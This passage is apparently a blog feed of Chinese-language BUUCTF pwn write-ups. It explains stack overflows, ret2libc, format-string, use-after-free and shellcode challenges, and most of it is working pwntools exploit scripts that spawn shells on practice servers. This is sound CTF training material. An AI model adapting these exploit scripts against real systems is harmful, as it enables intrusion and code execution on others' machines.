class="built_in">str</span>(<span class="built_in">type</span>).encode())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">2</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;Length &gt; &#x27;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Value &gt; &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;CNote &gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index &gt; &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;CNote &gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index &gt; &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>, <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;123456&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">2</span>, <span class="string">b&#x27;sh\x00\x00&#x27;</span> + p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]), <span class="number">0xc</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu060-wustctf2020-closed"><a href="#buu060-wustctf2020-closed" class="headerlink" title="buu060-wustctf2020_closed"></a>buu060-wustctf2020_closed</h1><p>这道题实际上是要我们理解linux标准输入输出。开启一个终端之后，对于这个终端来说有标准输入（文件描述符为0）、标准输出（1）和标准错误输出（2）三个标准IO流。这三个流的文件描述符指向的是一个地方，也就是开启的控制台。理解这道题题解<code>exec 1&gt;&amp;0</code>的关键是将控制台程序本身看成是一个文件，这个文件可以通过我们的键盘输入内容，也可以进行输出，输出的内容可以被我们看见，但输出本身仍然在这个文件中。程序关闭了标准输出和标准错误输出，但是输入没有关闭，三个文件描述符原本指向的都是这个控制台程序，那么现在我们只需要让标准输入重新指向控制台就可以了，也就是指向标准输入指向的地方。</p><p>如下图所示，这个控制台程序是pycharm内部的控制台，其标准输入、输出、错误输出都指向&#x2F;dev&#x2F;pts&#x2F;2。那么<code>exec 1&gt;&amp;0</code>实际上就等同于<code>exec 1&gt;/dev/pts/2</code>。<br><img src="https://img-blog.csdnimg.cn/f64b0e16746e4033acc32034e0ddaa98.png"><br>我们首先使用<code>exec 1&gt;&amp;0</code>打开输出流，查看一下标准输入流指向的位置，发现是<code>/dev/pts/2</code><br><img src="https://img-blog.csdnimg.cn/7d7b13c63cd3446c9925f2526da69930.png"><br>因此，下面的输入也可以打开输出流：<code>exec 1&gt;/dev/pts/2</code>（本地可以，远程不行因为没有file命令）<br><img src="https://img-blog.csdnimg.cn/6139c8e25c4c4f389fb3fc2e500f0128.png"></p><h1 id="buu061-pwnable-start"><a href="#buu061-pwnable-start" class="headerlink" title="buu061-pwnable_start"></a>buu061-pwnable_start</h1><p>这道题源程序非常简单，应该是用汇编写的，就两个函数。进行了两次系统调用，一次输出一次输入，栈可执行。</p><p>观察到输入的长度大于输出，可以通过返回到输出syscall上方的代码，跳过对输出长度<code>mov dl, 14h</code>的修改，而直接执行后面的<code>mov bl,1; mov al,4</code>，可以实现输出0x3C个字节的数据，以此来获取栈的地址。</p><p>打印出栈地址之后还可进行一次输出，可以将shellcode写入，然后执行shellcode即可。经过调试发现shellcode有44字节，写入shellcode之后正好就是返回地址的写入位置。但这里需要注意几点：</p><ol><li>不能直接将返回地址写到shellcode之后。虽然这样能够成功返回到shellcode，但是由于shellcode中有很多push指令，而shellcode在返回地址的低地址处，会导致shellcode的后面一部分被覆盖，无法正常执行。</li><li>不能直接将shellcode写到返回地址后面，因为输入的长度最多只能为0x3C字节，在返回地址之后最多只能写入0xC个字节，长度不够。</li></ol><p>因此考虑在返回地址之后单独写一个跳转的小gadget：<code>sub esp, 0x100; jmp ecx</code>。注意执行到这里时ecx的值和调用输入系统调用的ecx值相等，因此jmp ecx能够直接执行shellcode。而<code>sub esp,0x100</code>则是强制让栈下移，防止shellcode被覆盖。如此，返回地址就应该写<code>sub esp,0x100</code>的地址。</p><p><img src="https://img-blog.csdnimg.cn/7a253efba1d34b23b9e8239f6b5b4558.png"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">20</span>)</span><br><span class="line">payload += p32(<span class="number">0x804808B</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Let\&#x27;s start the CTF:&#x27;</span>, payload)</span><br><span class="line">io.recvuntil(p32(<span class="number">0x804808b</span>))</span><br><span class="line">stack_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">payload += p32(stack_addr + <span class="number">0x14</span>)</span><br><span class="line">payload += asm(<span class="string">&quot;sub esp, 0x100;&quot;</span></span><br><span class="line">               <span class="string">&quot;jmp ecx;&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwn write-ups (1)</title>
      <link href="/2023/02/28/buuctf-pwn-write-ups-1/"/>
      <url>/2023/02/28/buuctf-pwn-write-ups-1/</url>
      
        <content type="html"><![CDATA[<p><a href="https://buuoj.cn/challenges">BUUCTF网站</a></p><p>笔者认为过于简单的题目会直接附上exp。<br><del>（不得不说buu的题目还挺多的）</del><br>零基础pwn萌新推荐先看这个：<a href="https://www.bilibili.com/video/BV1854y1y7Ro">视频</a></p><h1 id="buu001-test-your-nc"><a href="#buu001-test-your-nc" class="headerlink" title="buu001-test_your_nc"></a>buu001-test_your_nc</h1><p>连上就行</p><h1 id="buu002-rip"><a href="#buu002-rip" class="headerlink" title="buu002-rip"></a>buu002-rip</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27534</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(cyclic(<span class="number">15</span>) + p64(<span class="number">0x401186</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu003-warmup-csaw-2016"><a href="#buu003-warmup-csaw-2016" class="headerlink" title="buu003-warmup_csaw_2016"></a>buu003-warmup_csaw_2016</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25377</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, cyclic(<span class="number">64</span>+<span class="number">8</span>) + p64(<span class="number">0x40060D</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu004-ciscn-2019-n-1"><a href="#buu004-ciscn-2019-n-1" class="headerlink" title="buu004-ciscn_2019_n_1"></a>buu004-ciscn_2019_n_1</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26735</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Let\&#x27;s guess the number&#x27;</span>, cyclic(<span class="number">44</span>) + p32(<span class="number">0x41348000</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu005-pwn1-sctf-2016"><a href="#buu005-pwn1-sctf-2016" class="headerlink" title="buu005-pwn1_sctf_2016"></a>buu005-pwn1_sctf_2016</h1><p>这道题是一个C++ pwn，但是逻辑不难理解，简单分析一下。下面是IDA反汇编的漏洞函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+3Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">7</span>]; <span class="comment">// [esp+40h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+47h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">7</span>]; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">5</span>]; <span class="comment">// [esp+4Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">32</span>, edata);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, s);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v4, <span class="string">&quot;you&quot;</span>, &amp;v5);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v6, <span class="string">&quot;I&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">replace</span>((std::string *)v3);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, v3, v6, v4);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v3);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v6);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v4);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  v0 = (<span class="type">const</span> <span class="type">char</span> *)std::string::<span class="built_in">c_str</span>((std::string *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里重点关注”&#x3D;”和replace函数，这也是程序在栈内存中操作的重点。在调试过程中，那些<code>std::allocator&lt;char&gt;::allocator</code>的语句对栈区没有明显的影响，略过。经过手动反编译，还原出的源代码大致如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string input;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">char</span> info[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line"><span class="built_in">fgets</span>(info, <span class="number">32</span>, stdin);</span><br><span class="line">input = info;</span><br><span class="line">string you = <span class="string">&quot;you&quot;</span>;</span><br><span class="line">string I = <span class="string">&quot;I&quot;</span>;</span><br><span class="line">rep = <span class="built_in">replace</span>(input, you, I);<span class="comment">// replace &quot;I&quot; with &quot;you&quot;</span></span><br><span class="line"><span class="built_in">strcpy</span>(info, rep.<span class="built_in">c_str</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">vuln</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的功能是将info中所有的”I”换成”you”，replace函数甚至都无需分析。由此很容易看出这里有潜在的溢出问题。而且程序本身也给了后门，因此直接修改返回地址即可。<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span> * <span class="number">20</span> + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x8048f0d</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu006-jarvisoj-level0"><a href="#buu006-jarvisoj-level0" class="headerlink" title="buu006-jarvisoj_level0"></a>buu006-jarvisoj_level0</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26344</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Hello, World&#x27;</span>, cyclic(<span class="number">128</span>+<span class="number">8</span>) + p64(<span class="number">0x400596</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu007-ciscn-2019-c-1"><a href="#buu007-ciscn-2019-c-1" class="headerlink" title="buu007-ciscn_2019_c_1"></a>buu007-ciscn_2019_c_1</h1><p>常规的获取got表地址，LibcSearcher有的时候可以有的时候不行，题目能给libc是最好的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25958</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc-2.33.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + cyclic(<span class="number">0x50</span>+<span class="number">7</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">b&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv(<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">put_addr = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(put_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, put_addr)</span><br><span class="line">libc_base = put_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + cyclic(<span class="number">0x50</span>+<span class="number">7</span>)</span><br><span class="line">payload += p64(<span class="number">0x4006b9</span>)<span class="comment"># ret</span></span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu008-第五空间2019-决赛-PWN5"><a href="#buu008-第五空间2019-决赛-PWN5" class="headerlink" title="buu008-[第五空间2019 决赛]PWN5"></a>buu008-[第五空间2019 决赛]PWN5</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28577</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;<span class="number">0x804C044</span>: <span class="number">0</span>&#125;)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu009-ciscn-2019-n-8"><a href="#buu009-ciscn-2019-n-8" class="headerlink" title="buu009-ciscn_2019_n_8"></a>buu009-ciscn_2019_n_8</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26497</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s your name?&#x27;</span>, cyclic(<span class="number">4</span> * <span class="number">13</span>) + p32(<span class="number">17</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu010-jarvisoj-level2"><a href="#buu010-jarvisoj-level2" class="headerlink" title="buu010-jarvisoj_level2"></a>buu010-jarvisoj_level2</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29788</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x804a024</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input:&#x27;</span>, cyclic(<span class="number">0x88</span>) + p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>]) + p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]) + p32(binsh_addr) + p32(binsh_addr))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu011-OGeek2019-babyrop"><a href="#buu011-OGeek2019-babyrop" class="headerlink" title="buu011-[OGeek2019]babyrop"></a>buu011-[OGeek2019]babyrop</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27628</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">exp = <span class="number">0x8048825</span></span><br><span class="line">ret = <span class="number">0x8048502</span></span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xFF&#x27;</span> * <span class="number">0x1f</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0xe7</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p32(exp)</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Correct\n&#x27;</span>, payload)</span><br><span class="line">io.send(<span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xFF&#x27;</span> * <span class="number">0x1f</span>)</span><br><span class="line">read = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">base = read - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sys = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0xe7</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(sys)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Correct\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu012-bjdctf-2020-babystack"><a href="#buu012-bjdctf-2020-babystack" class="headerlink" title="buu012-bjdctf_2020_babystack"></a>buu012-bjdctf_2020_babystack</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27538</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;length of your name:&#x27;</span>, <span class="string">b&#x27;1000&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s u name?&#x27;</span>, cyclic(<span class="number">0x10</span> + <span class="number">8</span>) + p64(elf.symbols[<span class="string">&#x27;backdoor&#x27;</span>]))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 